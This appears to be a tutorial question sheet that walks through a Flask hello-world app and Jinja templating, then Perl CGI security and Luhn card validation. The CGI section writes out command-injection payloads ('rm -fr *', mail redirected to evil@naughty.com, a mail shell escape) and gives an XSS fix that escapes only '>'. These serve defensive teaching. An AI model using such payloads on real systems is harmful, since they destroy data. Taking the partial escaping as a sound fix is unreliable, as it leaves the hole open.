Introduction to Flask

{% block questions %}
<ol>
<li>
What is Flask?
<p>
Why is Flask good for COMP[29]041?
<p>
Can it also be used for large real applications?

<div class="answer">
Flask is a a very popular web framework based on Python.
<p>
It is good for COMP[29]041 because it is possible to write very
simple Flask application.
<p>
It has powerful features available and is  used in large high traffic applications at companies such
as pinterest, linkedin, twilio and lyft.
</div>
<li>
Discuss the lines in this "hello world" Flask app:

{{ include_code("hello_word_flask.py") }}

<div class="answer">

<pre class="program">
from flask import Flask
</pre>
imports the main <code>Flask</code> into the program's webspace.
<p>
Apps usually need to import other names as well, as you can
see in the code you have been given for the lab.

<pre class="program">
app = Flask(__name__)
</pre>

creates the a Flask object.
<p>
Its argument (<code>__name__</code>) is not important for our the little apps your
work on in the lab.
<p>
<code>__name__</code> is a special Python name which evaluates to the name
of the current package, or <code> '__main__'</code> when the code is run directly.

<pre class="program">
@app.route('/')
</pre>

This line associates a URL pattern with the following function (<code>hello_world</code>).
<p>
This means if Flask receives a request for a URL fitting this pattern it will
call the function.
<p>
Its argument (<code>__name__</code>) is not important for our the little apps your
work on in the lab.
<p>
The <b>@</b> character is Python syntax for a <b>decorator</b>.  Decorators provide a
readable way of altering the behaviour of Python function using other functions.
<p>
In this case the <b>route</b> decorator just causes the Flask app to record that
URL of this pattern should be "routed" to this function.
<p>
You don't need to understand decorators to use Flask or do the lab,
but its highly recommended (at some stage)
you try to write your  decorators to understand properly how they work.

<pre class="program">
def hello_world():
    return 'Hello, World!'
</pre>

This function returns the content for the URL that has been "routed" to it.
<p>
Note the function name doesn't matter.

<pre class="program">
if __name__ == '__main__':
    app.run(debug=True)
</pre>

If the script is run directly (rather than imported).  This will run Flask as a webserver.
</div>

<li>

How do you the run the Flask  "hello world" Flask app

<div class="answer">

Like this
<pre class="command_line">
<kbd class="shell">./hello_world_flask.py</kbd>
 * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 204-542-564
</pre>

Then access <a href= "http://127.0.0.1:5000/">http://127.0.0.1:5000/</a> from a web browser
running on the same machine.  Note you can't do this on CSE's login servers or vlab.
</div>


<li>

Discuss this code from game.py which you are given for the lab.

<pre class="program">
@app.route('/', methods=['GET','POST'])
@app.route('/start', methods=['GET','POST'])
def start():
    session['number_to_guess'] = random.randint(1, MAX_NUMBER_TO_GUESS)
    return render_template('game_start.html', max_number_to_guess=MAX_NUMBER_TO_GUESS)
</pre>

<div class="answer">

<pre class="program">
@app.route('/', methods=['GET','POST'])
@app.route('/start', methods=['GET','POST'])
</pre>

These 2  lines (decorators) cause Flask to route requests matching eietehr of
those patterns to the following function.

<pre class="program">
    session['number_to_guess'] = random.randint(1, MAX_NUMBER_TO_GUESS)
</pre>

creates a random number and stores in a session cookie so it will be available
in subsquent requests to Flask from the same client.

<pre class="program">
    return render_template('game_start.html', max_number_to_guess=MAX_NUMBER_TO_GUESS)
</pre>

This returns the contents of <code>game_start.html</code> after applying Jinja
templating to it.  The variable <code>max_number_to_guess</code> can be used in the template
and will have the value <code>MAX_NUMBER_TO_GUESS</code>
</div>

<li>

What is Jinja?

<div class="answer">
Jinja is popular templating engine provided with Flask.
<p>
It is useful when you want to embed dynamic-generated values in HTML content.
<p>
It allows you to embed Python within HTML.
</div>
<li>

Discuss the contents of <code>game_start.html</code>:

{{ include_code("game_start.html") }}

<div class="answer">
<pre class="program">
{% raw %}
{% extends "game_base.html" %}
{% endraw %}
</pre>

This says this page will inherit the contents <code>game_start.html</code>
<p>
This is useful because often many pages have common content.
<p>
This simple inheritence allows the content to be placed in a single file.

<pre class="program">
{% raw %}
{% block body %}
{% endblock %}
{% endraw %}
</pre>

This says replace the <code>body</code> block of the inherited page
with what is between the Jinja <code>block</code> and <code>endblock</code> statements.

<pre class="program">
{% raw %}
    Enter a guess between 1 and {{max_number_to_guess}} (inclusive):
{% endblock %}
{% endraw %}
</pre>

The {{'{{'}} {{'}}'}} allows us to include a Python expression in a Jina template
<p>
In this case its just a variable,  <code>max_number_to_guess</code>, whose value we passed
in via <code>render_template</code>.

<pre class="program">
{% raw %}
{% block body %}
&lt;form method="POST" action="guess">
    &lt;input type="textfield" name="guess">
&lt;/form>
{% endblock %}
{% endraw %}
</pre>

This is the  HTML for a form.
</div>

<li>

Discuss what you need to do for the first lab exercise including which files you change or create.
<li>

Discuss the contents of <code>students.txt</code>.
<li>

Discuss what you need to do for the second lab exercise including which files you change or create.

<li>

Discuss the contents of the <code>assessments</code> directory for the peer assessment exercise.

A CGI script contains the following Perl:
<p>
<pre>
print "&lt;!-- ".join(",", map({"$_='".param($_)."'"} param()))."-->\n";
</pre>
<p>
What does it do?
<p>
Why is this useful?
<p>
Indicate a bug and why it creates a security hole.
<p>
Rewrite the code, fixing the bug.

<div class="answer">
It outputs an HTML comment containing the value of all parameters.
<p>
This is useful for debugging because these parameters are
usually the key input to your CGI script.
<p>
It doesn't check if  the value of a parameter contains HTML code.
<p>
Displaying HTML code from a malicious user is an <a href="http://en.wikipedia.org/wiki/Cross-site_scripting">easily exploited security hole</a>.
<p>
This code is simpler and avoids some possible problems:

<pre>
print "&lt;!-- ";
foreach $param (param()) {
    my $value = param($param);
    $value =~ s/\&gt;/&amp;gt;/g;
    print "$param='$value' "
}
print "-->\n";
</pre>

</div>

<li>

The following CGI script sends a message to the script author,
whose login name is <code>you</code>.
The message subject and the message body are available via the
script parameters <code>MailSubject</code> and <code>MailBody</code>
provided by filling in a form.
<P>
Consider for a moment that you are a hacker
(yes, I know it's difficult but just pretend :-).
What are the potential security problems with such a script
that you could exploit?
Can you think of different ways they could be exploited
(be creative, hackers certainly are)?
How can they be overcome?

<pre class="program">
#!/usr/bin/perl
use CGI ':all';
print header, start_html;
$subject = param('MailSubject');
$message = param('MailBody');
if (!open(MAIL, "|mail -s \"$subject\" you")) {
    print h1("Sorry, can't send mail.");
} else {
    print MAIL $message;
    close(MAIL);
}
print end_html;
</pre>

<div class="written_answer">
Some of the potential security problems that I know about (there may be others):

<ul>
<li>
People could use backquotes in the <code>$subject</code> variable.
Since the <code>open</code> is done by passing the <code>mail</code>
command line to a shell, the backquotes can be used to execute any
arbitrary command <em>before</em> attempting to run <code>mail</code>.
<p>
Example: <code>$subject == "`/bin/rm -fr .`"</code> executes the command

<pre class="program">
mail -s "`/bin/rm -fr *`" you
</pre>

which removes a whole bunch of files, and uses the output of the
<code>rm</code> command (which ought to be the empty string)
as the subject of the mail.
<P>
<I>Note:</I> using single quotes in the mail command
would protect against back ticks, but not the next exploit.
<li>
People could supply a <code>$subject</code> that terminated the
subject command line argument, sent the mail to some other address,
and then appended some arbitrary Unix commands after a semicolon.
Once again, they can execute an arbitrary command as you.
<p>
Example: <code>$subject == "done\" evil@naughty.com; rm -fr *; echo \"haha tricked"</code> executes
the command

<pre class="program">
mail -s "done" evil@naughty.com; rm -fr *; echo "haha tricked" you
</pre>

which sends mail to <code>evil@naughty.com</code> and then removes a
whole bunch of files.

<li>
Some versions of <code>mail</code> allow you to put a line like
<code>.!<i>command</i></code> to execute commands while you're
typing in a message (this is typically called a "shell escape").
People could use the <code>mail</code> command's shell escape
mechanisms to embed arbitrary commands in the body of the message.
<p>
Example: <code>$message == "Hello\n.!rm -fr *\nHope you liked the surprise!"</code>
sends the message "Hello\nHope you liked the surprise!", but as a side-effect also
executes the <code>rm</code> command to remove a whole bunch of files.
</ul>
<p>
To avoid such problems, you would need to make both the
<code>$subject</code> and <code>$message</code> variables
"safe" before using them.
This could be achieved simply by removing any problematic
characters (like backquotes, tildes, exclamation marks, dots).
You should also run the script using Perl's <code>-T</code> flag
(check for "tainted" code),
which causes Perl to not even execute your
script if you haven't taken enough precautions to avoid
(many) potential problems.

The validation algorithm
 used for credit cards is an old one devised by
<a href="http://en.wikipedia.org/wiki/Hans_Peter_Luhn">Hans-Peter Luhn</a>
(1896-1964), a mathematician at IBM.
<P>
The <a href="https://en.wikipedia.org/wiki/Luhn_algorithm">Luhn formula</a> sums all the digits,
with weights of 1 for odd positions and 2 for even positions (so every even digit is
doubled before adding it to the sum). Odd and even is worked out by counting from the right, as usual.
However, if any doubled digit exceeds 9, the two digits of the result are added together,
creating a "reduced sum". This reduced sum is added to the total (not the double digit number).
For example, a digit 7 in an even position is doubled to make 14,
so its contribution to the total is
1+4=5.
The credit card number is valid if the total is a multiple of 10.
<P>
Here is a (fictitious) VISA card number,
entered the way web forms should allow if their developers
weren't so lazy:
<b>4564-7953-6021-9047</b>.
Remembering that odd and even positions are counted from the right,
<pre>
Code:    4 5 6 4 7 9 5 3 6 0 2 1 9 0 4 7
Weights: 2 1 2 1 2 1 2 1 2 1 2 1 2 1 2 1
Sum:     8 5 3 4 5 9 1 3 3 0 4 1 9 0 8 7
(reduced):   *   *   *   *       *
</pre>
and the sum is 70, and 70 mod 10 = 0 as required.
<p>
Here is a Python program which takes credit-card numbers
as arguments and indicates whether they are not valid or not.

{{include_code("creditcard.py")}}

And here is it in action:

<pre>
$ ./creditcard.py 2389423423423467 9182387723427777 9182380923427773 4564456445644564
2389423423423467 is valid
9182387723427777 is invalid
9182380923427773 is invalid
4564456445644564 is valid
</pre>
